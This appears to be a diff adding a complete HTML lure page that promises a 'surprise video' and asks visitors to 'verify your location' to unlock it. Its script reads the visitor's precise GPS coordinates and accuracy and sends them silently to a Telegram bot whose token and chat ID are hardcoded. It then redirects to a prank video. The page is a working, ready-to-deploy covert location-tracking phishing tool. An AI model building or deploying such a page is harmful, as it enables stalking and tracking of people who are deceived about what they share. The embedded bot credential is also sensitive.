@@ -1,0 +1,84 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Special Video For You</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #0077b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🎁 A Surprise Video Just For You!</h2>
+    <p>Tap below to verify your location and unlock the video.</p>
+    <button onclick="sendLocation()">Allow Location</button>
+    <p id="status"></p>
+  </div>  <script>
+    const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
+    const chatId = "6038115234";
+
+    function sendLocation() {
+      const status = document.getElementById("status");
+      if (navigator.geolocation) {
+        status.textContent = "Getting location...";
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const time = new Date().toLocaleString();
+
+            const message = `📍 New Location Received:%0A📌 Lat: ${lat}%0A📌 Long: ${lon}%0A🎯 Accuracy: ${acc} meters%0A🕒 Time: ${time}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            fetch(url)
+              .then(() => {
+                status.textContent = "✅ Location sent successfully! Video unlocking...";
+                setTimeout(() => {
+                  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // prank video ;)
+                }, 2000);
+              })
+              .catch(() => {
+                status.textContent = "❌ Failed to send location. Try again later.";
+              });
+          },
+          () => {
+            status.textContent = "❌ Location permission denied.";
+          }
+        );
+      } else {
+        status.textContent = "❌ Geolocation not supported.";
+      }
+    }
+  </script></body>
+</html>
